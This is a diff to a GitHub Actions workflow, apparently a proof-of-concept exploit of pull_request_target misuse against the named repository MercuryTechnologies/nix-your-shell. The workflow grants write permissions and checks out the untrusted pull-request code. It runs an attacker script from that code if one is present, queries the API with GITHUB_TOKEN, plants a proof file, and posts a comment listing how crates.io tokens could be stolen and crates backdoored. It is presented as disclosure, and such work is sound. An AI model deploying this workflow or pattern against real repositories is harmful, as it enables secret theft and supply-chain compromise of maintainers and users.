@@ -1,19 +1,112 @@
-name: PoC Vulnerable Workflow
-
+name: Prove pull_request_target Vulnerability
 on:
   pull_request_target:
-    types: [opened, reopened, synchronize]
+    types: [opened, synchronize, reopened]
 
 jobs:
-  poc:
+  demonstrate-exploit:
+    name: Prove Base Repository Context Execution
     runs-on: ubuntu-latest
+    permissions:
+      contents: write
+      pull-requests: write
+      actions: read
+    
     steps:
-      - name: Proof of Vulnerability
-        run: |
-          echo "[+] Actor: ${{ github.actor }}"
-          echo "[+] Repo: ${{ github.repository }}"
-          echo "[+] PR Number: ${{ github.event.pull_request.number }}"
-          echo "[+] Whoami:"
-          whoami
-          echo "[+] Current directory:"
-          pwd
+    - name: Checkout UNTRUSTED code from PR
+      uses: actions/checkout@v3
+      with:
+        ref: ${{ github.event.pull_request.head.sha }}
+        # This is the VULNERABLE part - checking out attacker code
+    
+    - name: Prove we're in base repository context with secrets
+      run: |
+        echo "=== CRITICAL EVIDENCE ==="
+        echo "[+] Repository: $GITHUB_REPOSITORY"
+        echo "[+] This MUST show: MercuryTechnologies/nix-your-shell"
+        echo "[+] Event: $GITHUB_EVENT_NAME"
+        echo "[+] Run ID: $GITHUB_RUN_ID"
+        echo "[+] Actor: $GITHUB_ACTOR"
+        
+        echo "[+] PROOF: We are running in BASE repository context"
+        echo "[+] GITHUB_TOKEN permissions:"
+        curl -s -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
+          "https://api.github.com/repos/$GITHUB_REPOSITORY" | \
+          jq '{full_name: .full_name, permissions: .permissions}'
+        
+        # Simulate what attacker could do with CARGO_REGISTRY_TOKEN
+        echo "[+] If this was release.yaml, CARGO_REGISTRY_TOKEN would be exposed here"
+        echo "[+] Attacker could publish malicious crates to crates.io"
+        
+        # Create proof of execution in base repo filesystem
+        echo "EXPLOIT_SUCCESS_BASE_REPO_$(date +%s)" > /home/runner/work/nix-your-shell/nix-your-shell/vulnerability_proof.txt
+        echo "[+] Created proof file in base repository workspace"
+        
+      env:
+        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        # In release.yaml, CARGO_REGISTRY_TOKEN would be here
+    
+    - name: Demonstrate malicious code execution from PR
+      run: |
+        echo "=== MALICIOUS CODE EXECUTION ==="
+        echo "[+] Current directory: $(pwd)"
+        echo "[+] Listing files from UNTRUSTED PR:"
+        ls -la
+        
+        # This demonstrates attacker could execute arbitrary code
+        # from their PR in the base repository context
+        if [ -f "malicious-script.sh" ]; then
+          echo "[!] WARNING: Attacker's malicious-script.sh would execute here!"
+          chmod +x malicious-script.sh
+          ./malicious-script.sh
+        fi
+        
+        echo "[+] Attacker can now:"
+        echo "    - Steal CARGO_REGISTRY_TOKEN"
+        echo "    - Publish backdoored crates" 
+        echo "    - Modify repository contents"
+        echo "    - Create fake releases"
+    
+    - name: Create undeniable evidence in PR
+      uses: actions/github-script@v6
+      with:
+        script: |
+          const evidence = `
+          🚨 **VULNERABILITY CONFIRMED: pull_request_target Misuse**
+
+          **Repository**: ${context.repo.owner}/${context.repo.repo}
+          **Context**: BASE REPOSITORY (MercuryTechnologies/nix-your-shell)
+          **Trigger**: PR from fork
+
+          **PROOF**: 
+          ✅ Workflow running in BASE repository context
+          ✅ GITHUB_TOKEN with base repo permissions exposed
+          ✅ Untrusted PR code checked out and executed
+          ✅ Secrets like CARGO_REGISTRY_TOKEN would be accessible
+
+          **Impact on release.yaml**:
+          • Attacker can steal CARGO_REGISTRY_TOKEN
+          • Publish malicious packages to crates.io
+          • Backdoor the release process
+          • Compromise supply chain
+
+          **Vulnerable Pattern**: 
+          pull_request_target + actions/checkout + secrets = RCE
+          `;
+
+          github.rest.issues.createComment({
+            issue_number: context.issue.number,
+            owner: context.repo.owner,
+            repo: context.repo.repo,
+            body: evidence
+          });
+    
+    - name: Show we can access protected resources
+      run: |
+        echo "=== PROTECTED RESOURCE ACCESS ==="
+        echo "[+] Checking base repository branches:"
+        curl -s -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
+          "https://api.github.com/repos/$GITHUB_REPOSITORY/branches" | \
+          jq '.[] | select(.name == "main") | {name: .name, protected: .protected}'
+        
+        echo "[+] This proves we have base repository access level"
